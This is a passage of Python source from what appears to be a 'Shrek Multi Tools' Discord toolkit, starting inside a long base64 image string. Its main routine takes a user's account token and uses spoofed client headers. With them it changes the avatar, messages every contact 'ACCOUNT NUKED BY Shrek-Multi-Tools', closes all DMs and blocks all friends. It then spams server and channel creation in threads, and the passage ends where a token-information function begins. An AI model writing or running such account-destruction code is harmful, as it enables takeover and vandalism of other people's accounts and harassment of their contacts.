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"

        payload = {
            'avatar':url3
        }

        l = requests.patch('https://discord.com/api/v9/users/@me', headers=header, json=payload)

        print(Fore.WHITE + "Changed Pfp!")

        url4 = 'https://discord.com/api/v9/users/@me/relationships'
        header = {
            "authority": "discord.com",
            "path": f"/api/v9/users/@me/relationships",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{tukan}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        massdms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=header).json()
        for user in massdms:
          payload = {
            'content':'ACCOUNT NUKED BY Shrek-Multi-Tools'
          }
          l = requests.post(f"https://discord.com/api/v9/channels/{user['id']}/messages",headers=header, json=payload)
          if l.status_code == 200 or 204:
            print(f'Sent Dm to {user["id"]}')
          else:
            pass

        print('Dmed All Users')

        closedms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=header).json()
        for user in closedms:
          a = requests.delete(f"https://discord.com/api/v9/channels/{user['id']}",headers=header)
          if a.status_code == 200 or 204:
            print(f'Closed Dms With {user["id"]}')
          else:
            pass

        print(Fore.WHITE + 'Closed all dms')

        payload = {"type": 2}
        r = requests.get(url4, headers=header).json()

        for x in r:
            e = requests.put(f'https://discord.com/api/v9/users/@me/relationships/{x["id"]}', headers=header, json=payload)
            if e.status_code == 200 or 204:
                print(f"Successfully blocked {x['id']}")
            else:
                print(e)

        print(Fore.WHITE + "Blocked all friends")


        url2 = 'https://discord.com/api/v9/guilds'

        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": f"/api/v9/guilds",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{tukan}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        ids = []

        def servercreate():
            image = "data:image/jpeg;base64,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"
            for x in range(15):
                try:
                    r = requests.post(url2,headers=header, json={'name':"Nuked By Shrek", 'icon':image})
                    if r.status_code == 200 or 204 or 201:
                        print("Done!")
                        ids.append(r.json()['id'])
                    else:
                        print("Failed")
                except Exception as e:
                    print('Max Server Limit Acceded')

        def channelmake():
            length = len(ids)
            for b in range(length):
                for i in range(15):
                    url1 = f'https://discord.com/api/v9/guilds/{ids[b]}/channels'
                    r = requests.post(url1, headers=header, json={'name':'nuked-by-Shrek'})

        threads = []

        for _ in range(20):
            t = threading.Thread(target=servercreate)
            t.daemon = True
            t.start()
            threads.append(t)

        for thread in threads:
            t.join()

        threaad = []

        for r in range(40):
            a = threading.Thread(target=channelmake)
            a.daemon = True
            a.start()
            threaad.append(a)

        for thread in threaad:
            a.join()

        print("Finished Account has been destroyed!!!")
    elif options4 in ['0','00']:
      tool()
      return
    else:
      print('Invalid Option')

    while __name__ == '__main__' and options4 not in ['0','00']:
      print(Fore.WHITE)
      os.system('pause')
      tool()

  global tokeninfo
  def tokeninfo():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Token Information")
    print(f'''
{Fore.GREEN}
▓███████▓ ▒█████   ▀██ ▄█▀▓█████ ███▄    █       ██ ███▄    █    █████ ▒█████  
▓  ██▒ ▓▒▒██▒  ██▒  ██▄█▒ ▓█   ▀ ██ ▀█   █     ▒▓██ ██ ▀█   █  ▓██    ▒██▒  ██▒
▒ ▓██░ ▒░▒██░  ██▒ ▓███▄░ ▒███  ▓██  ▀█ ██▒    ░▒██▓██  ▀█ ██▒ ▒████  ▒██░  ██▒
░ ▓██▓ ░ ▒██   ██░ ▓██ █▄ ▒▓█  ▄▓██▒  ▐▌██▒     ░██▓██▒  ▐▌██▒ ░▓█▒   ▒██   ██░
  ▒██▒ ░ ░ ████▓▒░ ▒██▒ █▄░▒████▒██░   ▓██░     ░██▒██░   ▓██░▒░▒█░   ░ ████▓▒░
  ▒ ░░   ░ ▒░▒░▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒░   ▒ ▒      ░▓ ░ ▒░   ▒ ▒ ░ ▒ ░   ░ ▒░▒░▒░ 
    ░      ░ ▒ ▒░  ░ ░▒ ▒░ ░ ░  ░ ░░   ░ ▒░      ▒ ░ ░░   ░ ▒░░ ░       ░ ▒ ▒░ 
  ░ ░    ░ ░ ░ ▒   ░ ░░ ░    ░     ░   ░ ░       ▒    ░   ░ ░   ░ ░   ░ ░ ░ ▒  
             ░ ░   ░  ░      ░           ░       ░          ░ ░           ░ ░  
                                        
    ''')
    url = 'https://discord.com/api/v9/users/@me'

